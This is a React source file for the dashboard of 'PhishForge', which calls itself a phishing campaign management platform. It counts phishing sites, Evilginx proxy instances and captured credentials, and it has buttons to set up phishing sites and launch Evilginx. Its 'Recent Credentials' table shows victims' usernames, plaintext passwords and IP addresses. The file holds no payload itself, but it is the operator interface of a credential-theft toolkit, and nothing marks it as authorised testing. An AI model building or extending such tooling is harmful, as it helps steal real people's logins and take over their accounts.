import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { API_ENDPOINTS, fetchApi } from '../api';


// Import icons
const DomainIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="12" cy="12" r="10"></circle>
    <line x1="2" y1="12" x2="22" y2="12"></line>
    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
  </svg>
);

const PhishingSiteIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
  </svg>
);

const EvilginxIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect>
    <rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect>
    <line x1="6" y1="6" x2="6.01" y2="6"></line>
    <line x1="6" y1="18" x2="6.01" y2="18"></line>
  </svg>
);

const CredentialsIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
  </svg>
);

function Dashboard({ status }) {
  const [credentials, setCredentials] = useState([]);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    // Fetch the latest credentials
    fetchApi(API_ENDPOINTS.credentials.list)
      .then(data => {
        if (data.status === 'success') {
          // Get only the most recent 5 credentials
          const recentCreds = data.credentials
            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
            .slice(0, 5);
          setCredentials(recentCreds);
        }
        setLoading(false);
      })
      .catch(error => {
        console.error('Error fetching credentials:', error);
        setLoading(false);
      });
  }, []);

  return (
    <div className="dashboard">
      <h1>Dashboard</h1>
      <p className="dashboard-description">
        Welcome to PhishForge - your centralized phishing campaign management platform.
      </p>

      {/* Stats overview */}
      <div className="stats-grid">
        <div className="stat-card">
          <DomainIcon />
          <div className="stat-value">{status.domains_count || 0}</div>
          <div className="stat-label">Domains</div>
        </div>
        <div className="stat-card">
          <PhishingSiteIcon />
          <div className="stat-value">{status.phishing_sites_count || 0}</div>
          <div className="stat-label">Phishing Sites</div>
        </div>
        <div className="stat-card">
          <EvilginxIcon />
          <div className="stat-value">{status.evilginx_instances_count || 0}</div>
          <div className="stat-label">Evilginx Instances</div>
        </div>
        <div className="stat-card">
          <CredentialsIcon />
          <div className="stat-value">{status.credentials_count || 0}</div>
          <div className="stat-label">Captured Credentials</div>
        </div>
      </div>

      {/* Quick actions */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Quick Actions</h2>
        </div>
        <div className="quick-actions">
          <Link to="/domains" className="btn">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="16"></line>
              <line x1="8" y1="12" x2="16" y2="12"></line>
            </svg>
            Setup Domain
          </Link>
          <Link to="/phishing" className="btn">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 2l10 6.5v7L12 22 2 15.5v-7L12 2z"></path>
            </svg>
            Setup Phishing Site
          </Link>
          <Link to="/evilginx" className="btn">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
              <line x1="8" y1="21" x2="16" y2="21"></line>
              <line x1="12" y1="17" x2="12" y2="21"></line>
            </svg>
            Launch Evilginx
          </Link>
          <Link to="/monitoring" className="btn">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
              <circle cx="12" cy="12" r="3"></circle>
            </svg>
            View Credentials
          </Link>
        </div>
      </div>

      {/* Recent credentials */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Recent Credentials</h2>
          <Link to="/monitoring" className="btn btn-outline">View All</Link>
        </div>
        
        {loading ? (
          <div className="loading">
            <div className="loading-spinner"></div>
          </div>
        ) : credentials.length > 0 ? (
          <div className="table-responsive">
            <table>
              <thead>
                <tr>
                  <th>Source</th>
                  <th>Username</th>
                  <th>Password</th>
                  <th>IP Address</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {credentials.map((cred, index) => (
                  <tr key={index}>
                    <td>{cred.source || 'Unknown'}</td>
                    <td>{cred.username || '-'}</td>
                    <td>{cred.password || '-'}</td>
                    <td>{cred.ip || '-'}</td>
                    <td>{new Date(cred.timestamp).toLocaleString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <div className="empty-state">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1" strokeLinecap="round" strokeLinejoin="round" className="empty-icon">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            <p>No credentials captured yet.</p>
          </div>
        )}
      </div>

      {/* System status */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">System Status</h2>
        </div>
        <div className="system-status">
          <p>
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="icon-inline">
              <circle cx="12" cy="12" r="10"></circle>
              <polyline points="12 6 12 12 16 14"></polyline>
            </svg>
            <strong>Uptime:</strong> {status.uptime || 'Unknown'}
          </p>
          <p>
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="icon-inline">
              <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
              <circle cx="9" cy="7" r="4"></circle>
              <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
              <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
            </svg>
            <strong>Active Monitors:</strong> {status.monitors_count || 0}
          </p>
          <p>
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="icon-inline">
              <path d="M22 12h-4l-3 9L9 3l-3 9H2"></path>
            </svg>
            <strong>Server Health:</strong> <span className="status-good">Good</span>
          </p>
          <p>
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="icon-inline">
              <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
            </svg>
            <strong>Services:</strong> <span className="status-good">Running</span>
          </p>
        </div>
      </div>
    </div>
  );
}

export default Dashboard;